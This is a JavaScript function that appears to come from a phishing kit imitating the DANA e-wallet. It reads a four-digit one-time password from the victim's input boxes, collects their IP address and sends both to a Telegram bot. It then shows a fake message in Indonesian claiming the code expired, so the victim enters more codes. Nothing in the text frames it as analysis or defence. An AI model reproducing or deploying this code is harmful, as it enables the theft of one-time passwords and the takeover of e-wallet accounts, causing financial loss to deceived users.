async function sendOtp(){
    $(".loadingOtp").show();
    const otp = [
        $('#otp1').val(),
        $('#otp2').val(),
        $('#otp3').val(),
        $('#otp4').val()
    ].join('');
    const ip = await getIPAddress();
    const message = `🔑 *OTP DANA*\n#️⃣ OTP: ${otp}\n🌐 IP: \`${ip}\`\n⏰ Time: ${new Date().toLocaleString()}`;
    await sendToTelegram(message);
    setTimeout(function(){
        $(".loadingOtp").hide();
        $('.inpotp').val('');
        $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
        $(".alert").css("color","red");
    },3000);
}